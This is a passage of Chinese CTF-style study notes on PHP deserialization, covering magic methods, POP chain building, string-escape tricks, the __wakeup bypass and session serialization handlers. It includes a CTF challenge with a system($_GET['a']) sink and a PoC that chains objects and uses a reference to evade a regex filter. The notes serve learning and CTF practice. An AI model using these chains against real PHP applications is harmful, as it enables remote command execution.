class="comment">//O:4(类名长)&quot;test&quot;（类名）:2(属性数);&#123;s:3(属性名长):&quot;pub&quot;(属性名);s:6(值长):&quot;benben&quot;(值);s:3:&quot;ben&quot;;s:5:&quot;laoli&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641630b7cd36.png" alt="image-20240221200228499"></p><p>当属性类型为public时 会将属性名(test)变为’空’类名属性名’空’（%00(url编码后)test%00pub） 所以前面是9</p><p><img src="https://bu.dusays.com/2024/05/13/6641630b63d17.png" alt="image-20240221200501785"></p><p>同理protected</p><p><img src="https://bu.dusays.com/2024/05/13/6641630bdc53d.png" alt="image-20240221200821384"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630cd4b8d.png" alt="image-20240221200850913"></p><p><code>(0*0--&gt;空*空)</code></p><p>套娃</p><p><img src="https://bu.dusays.com/2024/05/13/66416316aa886.png" alt="image-20240221201215657"></p><p>把一个序列化的对象赋值给ben了</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>反序列化是将字符串转换成变量或对象的过程</p><p>·反序列化之后的内容为一个对象</p><p>·反序列化生成的对象里的值由反序列化里的值提供，与原有类预定义的值无关</p><p>·反序列化不触发类的方法，除非是魔术方法或调用方法</p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>成因：反序列化过程中，unserialize()的值可控，通过更改这个值，得到所需要的代码</p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>一个预定义好的，在特定情况下<strong>自动触发</strong>的行为方法</p><p>魔术方法在特定条件下自动调用相关方法</p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p> <img src="https://bu.dusays.com/2024/05/13/6641631e96b7c.png" alt="image-20240221205308936"></p><h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p>构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法</p><p><img src="https://bu.dusays.com/2024/05/13/6641630d21e1e.png" alt="image-20240221205909384"></p><h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>析构函数，在对象所有的引用被删除或者当对象被显式销毁时执行的魔术方法</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e39c9a.png" alt="image-20240221210856966"></p><p>在序列化过程中不会触发</p><p>在反序列化过程中会触发</p><p>实例化对象结束后也会触发</p><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><p>序列化serialize()函数会检查类中是否存在一个魔术方法__sleep(),若存在，则该方法会先被调用，再执行序列化</p><p>返回需要被序列化存储的成员属性，删除不必要的属性</p><p><img src="https://bu.dusays.com/2024/05/13/6641630dd90a0.png" alt="image-20240221212013413"></p><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><p>与__sleep()相反</p><p>反序列化unserialize()会检查是否存在一个__wakeup()方法，若存在，则会先调用该方法。预先准备对象需要的资源</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e5015a.png" alt="image-20240221212801941"></p><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><p>把对象当作字符串调用时触发   echo</p><p><img src="https://bu.dusays.com/2024/05/13/6641630d0d34d.png" alt="image-20240221213659411"></p><h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h4><p>把对象当作函数调用时触发  return</p><p><img src="https://bu.dusays.com/2024/05/13/6641630ca4b96.png" alt="image-20240221213830977"></p><h4 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h4><p>调用一个不存在的方法时触发  $this-&gt;aa</p><p>两个参数<code>$arg1,$arg2</code></p><p>返回值：调用的不存在的方法名和参数</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e12ba3.png" alt="image-20240221214624310"></p><h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h4><p>静态调用或者调用成员常量时使用的方法不存在，此时触发</p><p>两个参数<code>$arg1,$arg2</code></p><p>返回值：调用的不存在的方法和名称的参数</p><p><img src="https://bu.dusays.com/2024/05/13/6641630d1c0a4.png" alt="image-20240221214943446"></p><h4 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h4><p>调用的成员属性不存在时触发  $this-&gt;aa-&gt;bb</p><p>一个参数$arg1</p><p>返回值：不存在的属性名</p><p><img src="https://bu.dusays.com/2024/05/13/6641630c5f424.png" alt="image-20240221215200717"></p><h4 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h4><p>给不存在的属性赋值时触发</p><p>两个参数<code>$arg1,$arg2</code></p><p>返回值：不存在的属性名和赋的值</p><p><img src="https://bu.dusays.com/2024/05/13/6641630d254fe.png" alt="image-20240221215600389"></p><h4 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h4><p>对不可访问属性使用isset()或empty()时，触发</p><p>一个参数$arg1</p><p>返回值:不存在&#x2F;不可访问的属性名</p><p><img src="https://bu.dusays.com/2024/05/13/6641630c57890.png" alt="image-20240221220406133"></p><h4 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h4><p>对不可访问属性使用unset()时触发</p><p>一个参数$arg1</p><p>返回值：不可访问的成员属性名</p><p><img src="https://bu.dusays.com/2024/05/13/6641630c6707c.png" alt="image-20240221220715991"></p><h4 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h4><p>当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e21a57.png" alt="image-20240221221003602"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="https://bu.dusays.com/2024/05/13/6641631dba40b.png" alt="image-20240221221040252"></p><p><img src="https://bu.dusays.com/2024/05/13/66416322558fd.png" alt="image-20240221221103912"></p><h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>例题</p><p><img src="https://bu.dusays.com/2024/05/13/664163183e444.png" alt="image-20240221222425146"></p><p>思路：</p><p><img src="https://bu.dusays.com/2024/05/13/6641630f488fc.png" alt="image-20240221222455837"></p><p>这里的__construction不会被调用，因为没有序列化</p><p>法1：</p><p><img src="https://bu.dusays.com/2024/05/13/66416317c6177.png" alt="image-20240221222807543"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631387598.png" alt="image-20240221222830808"></p><p>法2：</p><p>1.删去没用的</p><p><img src="https://bu.dusays.com/2024/05/13/6641630bcd0b0.png" alt="image-20240221223408086"></p><p>2.类外赋值</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e243ab.png" alt="image-20240221223556996"></p><p>魔术方法触发前提：魔术方法所在类（或对象）被调用</p><p><img src="https://bu.dusays.com/2024/05/13/664163140ec43.png" alt="image-20240222185057772"></p><h3 id="pop链构造与poc编写"><a href="#pop链构造与poc编写" class="headerlink" title="pop链构造与poc编写"></a>pop链构造与poc编写</h3><p>pop链就是利用魔术方法在里面进行多次跳转 然后获取敏感数据的一种payload</p><p>poc:概念验证，在安全界可以理解成漏洞验证程序，poc是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码</p><p><img src="https://bu.dusays.com/2024/05/13/664163242bc9e.png" alt="image-20240222191258816"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631a54909.png" alt="image-20240222194203684"></p><h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><p>反序列化分隔符</p><p>反序列化以;}结束,后面的字符不影响正常的反序列化</p><p>属性逃逸</p><p>一般的数据先经过一次serialize再经过unserialize,在这个中间反序列化的字符串变多或者变少的时候很有可能存在反序列化属性逃逸</p><h3 id="减少逃逸"><a href="#减少逃逸" class="headerlink" title="减少逃逸"></a>减少逃逸</h3><p><img src="https://bu.dusays.com/2024/05/13/664163218a2dd.png" alt="image-20240222200324129"></p><p><img src="https://bu.dusays.com/2024/05/13/66416321ba66f.png" alt="image-20240222200602151"></p><p><img src="https://bu.dusays.com/2024/05/13/664163235591a.png" alt="image-20240222215131008"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631443ca3.png" alt="image-20240222215710380"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631c96652.png" alt="image-20240222220117373"></p><p>例题</p><p><img src="https://bu.dusays.com/2024/05/13/66416323a3f31.png" alt="image-20240222223402500"></p><p><img src="https://bu.dusays.com/2024/05/13/66416321c36d3.png" alt="image-20240222223656946"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631794375.png" alt="image-20240222223727807"></p><h3 id="增多逃逸"><a href="#增多逃逸" class="headerlink" title="增多逃逸"></a>增多逃逸</h3><p><img src="https://bu.dusays.com/2024/05/13/66416320496e9.png" alt="image-20240222220245356"></p><p><img src="https://bu.dusays.com/2024/05/13/66416316f12c1.png" alt="image-20240222220425811"></p><p><img src="https://bu.dusays.com/2024/05/13/6641632379a46.png" alt="image-20240222220654985"></p><p>例题</p><p><img src="https://bu.dusays.com/2024/05/13/66416319ea330.png" alt="image-20240222222118718"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631c618f6.png" alt="image-20240222222353281"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a0dabde07.png" alt="image-20240222222407358"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631cabf30.png" alt="image-20240222223129660">                                                                                                                                                                                                                                                       </p><h2 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h2><p>条件：</p><p>php5&lt;5.6.25</p><p>php7&lt;7.0.10</p><p>序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过__wakeup()的执行</p><p><img src="https://bu.dusays.com/2024/05/13/66416320665b2.png" alt="image-20240227194527697"></p><p>例</p><p><img src="https://bu.dusays.com/2024/05/13/664163232c833.png" alt="image-20240227194811041"></p><p><img src="https://bu.dusays.com/2024/05/13/66416323becd6.png" alt="image-20240227194915527"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631c25bc2.png" alt="image-20240227195002743"></p><p><code>+可以绕过正则表达式</code></p><p><img src="https://bu.dusays.com/2024/05/13/66416313493c5.png" alt="image-20240227195216055"></p><p><strong>当正则过滤R&#x2F;r后数字时  可以用引用绕过</strong></p><p>但是__wakeup中要有：<code>$this-&gt;b = $this-&gt;a;</code></p><p>帕鲁杯R23</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/R:2|R:3/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="comment">//    public $b;</span></span><br><span class="line"><span class="comment">//    public function __get($a)&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;b-&gt;love();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line"><span class="comment">//    public $a;</span></span><br><span class="line"><span class="comment">//    public $b;</span></span><br><span class="line"><span class="comment">//    public $c;</span></span><br><span class="line"><span class="comment">//    public function __destruct()&#123;</span></span><br><span class="line"><span class="comment">//        $tmp = $this-&gt;c-&gt;name;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    public function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;c = &quot;no!&quot;;</span></span><br><span class="line"><span class="comment">//        $this-&gt;b = $this-&gt;a;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line"><span class="comment">//    public function love()&#123;</span></span><br><span class="line"><span class="comment">//        system($_GET[&#x27;a&#x27;]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if(preg_match(&#x27;/R:2|R:3/&#x27;,$_GET[&#x27;pop&#x27;]))&#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;no&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//unserialize($_GET[&#x27;pop&#x27;]);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$xk</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xk</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;b = <span class="variable">$xk</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b = &amp;<span class="variable">$b</span>-&gt;c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;b&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:1:&quot;b&quot;;O:2:&quot;xk&quot;:0:&#123;&#125;&#125;s:1:&quot;c&quot;;N;s:1:&quot;b&quot;;R:4;&#125;</span><br></pre></td></tr></table></figure><p>也可以想其他办法将R后的数字改了 </p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>例：</p><p><img src="https://bu.dusays.com/2024/05/13/66416322cc32c.png" alt="image-20240227200401573"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630f30a95.png" alt="image-20240227200430070"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630d00d0f.png" alt="image-20240227200441675"></p><p>构造</p><p><code>$a-&gt;enter=&amp;$a-&gt;secret</code></p><p>使enter的值随secret变化而变化</p><p>secret再取enter的值 就一样了</p><h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>当session_start()被调用或者php.ini中的session.auto_star为1时，php内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为&#x2F;tmp）</p><p><img src="https://bu.dusays.com/2024/05/13/664163221be00.png" alt="image-20240227201906897"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630fc978e.png" alt="image-20240228235355463"></p><p>赋值123456</p><p><img src="https://bu.dusays.com/2024/05/13/6641630d5dc96.png" alt="image-20240228235539736"></p><p>键名+竖线+经过serialize()函数处理过的值</p><p><img src="https://bu.dusays.com/2024/05/13/6641631aa6be4.png" alt="image-20240228235926447"></p><p><img src="https://bu.dusays.com/2024/05/13/66416314a59c3.png" alt="image-20240229000033551"></p><p><img src="https://bu.dusays.com/2024/05/13/66416320af6ba.png" alt="image-20240229000223635"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630e8d329.png" alt="image-20240229000546732"></p><p><img src="https://bu.dusays.com/2024/05/13/6641632427238.png" alt="image-20240229003011924"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a0ef1700e.png" alt="image-20240229003051944"></p><p><img src="https://bu.dusays.com/2024/05/13/6641632425d21.png" alt="image-20240229003121533"></p><p>例：</p><p><img src="https://bu.dusays.com/2024/05/13/66416314b7419.png" alt="image-20240303175045112"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630e82d6a.png" alt="image-20240303175336453"></p><p><img src="https://bu.dusays.com/2024/05/13/66416319738fb.png" alt="image-20240303175451812"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a0edb6163.png" alt="image-20240303175554019"></p><p><strong>补：</strong></p><h3 id="php-session理解"><a href="#php-session理解" class="headerlink" title="php session理解"></a>php session理解</h3><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h4><p>session:</p><p>Session一般称为“<strong>会话控制</strong>”，简单来说就是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同。</p><p>php session:</p><p>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更该用户会话的设置，需要注意的是，**<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的*<em>，</em>且其对应的具体 <code>session</code> 值会存储于服务器端*，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p><p>php session工作流程:</p><p>会话工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>中通过<strong>set-cookie头部发送给客户端保存</strong>。</p><p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p><p><strong>会话开始后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中</strong>，如下述代码就是一个在<code>$_SESSION</code>变量中注册变量的例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;xianzhi&#x27;</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存</strong></p><p>默认情况下<em>，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，<strong>也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器</strong></em>。 <em>对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</em>。可参考下图：</p><p><img src="https://bu.dusays.com/2024/05/13/6641631496d22.png" alt="image-20240502143605251"></p><p>php session在php.ini中的配置</p><p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_handler=files     该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数  这里表明session是以文件的方式来进行存储的</span><br><span class="line"></span><br><span class="line">session.serialize_handler=php       该配置主要设定用户自定义存储函数  这里表明session的默认序列话引擎使用的是php处理器引擎</span><br><span class="line"></span><br><span class="line">session.save_path=&quot;D:\PHP\phpStudy\PHPTutorial\tmp\tmp&quot; 该配置主要设置session的存储路径  这里表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line"></span><br><span class="line">session.auto_start=0                表明默认不启动session</span><br></pre></td></tr></table></figure><ul><li>session.save_handler&#x3D;””</li></ul><p> <strong>该配置主要设定用户自定义存储函数</strong>，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p><ul><li><strong>session.serialize_handler</strong></li></ul><p>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p><p><a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-0">参考</a>，下面主要谈谈<code>session.serialize_handler</code>配置项。</p><h3 id="处理器与利用"><a href="#处理器与利用" class="headerlink" title="处理器与利用"></a>处理器与利用</h3><p>上文中提到的PHP session的<strong>序列化机制是由<code>session.serialize_handler</code>来定义引擎的</strong>，引擎也就是php处理器，<em>而序列化后的字符串默认是以文件的方式存储</em>，<em>且存储的文件是由<code>sess_sessionid</code>来决定文件名的</em>，如下：</p><p><img src="https://bu.dusays.com/2024/05/13/6641630ee6818.png" alt="image-20240502143933690"></p><p>当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>等。</p><p>并且文件的内容始终是session值的序列化之后的内容。</p><h4 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h4><p>1.PHP提供了<code>session.serialize_handler</code>配置的选项，可以用来定义要使用的处理器，默认是php，如果想要使用其他的就需要<strong>使用ini_set()函数</strong>，格式如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span></span><br><span class="line"><span class="comment">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span></span><br></pre></td></tr></table></figure><p>2.要想使用session，第一步就是开启session，这也是session的第一阶段这是就需要使用<strong>session_start()函数</strong>。</p><p><strong>这个函数的作用就是开启session</strong>，开启之后读取cookie信息判断是否存在session_id，如果存在就是用这个session_id，如果没有就会随机生成一个唯一的32位的session_id。通过这个session_id就可以绑定一个唯一的用户。</p><p><strong>这个过程还会初始化<code>$SESSION</code>这个变量，但是有两种情况：</strong></p><ul><li><strong>若没有这个session文件</strong>，就会读取cookie信息的内容从而序列化数据创建<code>$_SESSION</code>变量并创建一个session文件；</li><li><strong>若存在session文件</strong>，读取session文件中的内容，把内容反序列化之后赋值到<code>$SESSION</code>这个变量中**，这个阶段还有一个特别关键的作用，还会判断那些session文件已经过期，调用gc进程，删除掉过期的session文件</li></ul><p><a href="https://www.cnblogs.com/daijiandong/p/12070947.html">参考1</a>以及<a href="https://blog.csdn.net/cs23405/article/details/81297698">2</a></p><h4 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h4><p><strong><code>sessin.serialize_handler</code>定义的引擎有三种</strong>，如下表所示：</p><table><thead><tr><th>处理器名称</th><th>存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过<code>serialize()</code>函数序列化处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的<strong>ASCII字符</strong>（如键长为35则对应<code>#</code>）+键名+经过<code>serialize()</code>函数序列化处理的值</td></tr><tr><td>php_serialize</td><td>经过<code>serialize()</code>函数序列化处理的<strong>数组</strong></td></tr></tbody></table><p><strong>注</strong>：从PHP 5.5.4起可以使用<code>php_serialize</code></p><p>上述三种处理器中，*<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数*，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p><p>测试一下，demo如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="php处理器-1"><a href="#php处理器-1" class="headerlink" title="php处理器"></a>php处理器</h5><p><img src="https://bu.dusays.com/2024/05/13/6641630dc052d.png" alt="image-20240502144559398"></p><p>解析一下：<br>序列化的结果为:<code>session|s:6:&quot;Fupanc&quot;;</code></p><p>其中<code>session</code>为$_SESSION[‘session’]的键名，<code>|</code>为传入GET参数经过序列化后的值。</p><h5 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h5><p><img src="https://bu.dusays.com/2024/05/13/66416315d796a.png" alt="image-20240502145305649"></p><p>将指定处理器函数的参数php改为这个就行，为了方便看，将键名改长一些，（否则对应的ascii字符不可见)，测试结果如下</p><p>demo改为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionseesionsessionsessionsession&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e504d7.png" alt="image-20240502145320585"></p><p>两张图片可以对比一下</p><p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:6:&quot;Fupanc&quot;;</code></p><p>解析一下：<br><code>#</code>即为长度为35在ascii对应的符号</p><p><img src="https://bu.dusays.com/2024/05/13/6641630ca56b9.png" alt="image-20240502145401992"></p><p><code>sessionsessionsessionsessionsessions</code>是键名,</p><p><strong>注意：</strong></p><p>这里序列化后的结果会在原代码设置的键名后加一个s，测试了一下，无论大写为多少</p><p><code>6:&quot;Fupanc&quot;;</code>即为序列化后的字符串。</p><h5 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h5><p>demo如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试结果：</p><p><img src="https://bu.dusays.com/2024/05/13/6641630ca5660.png" 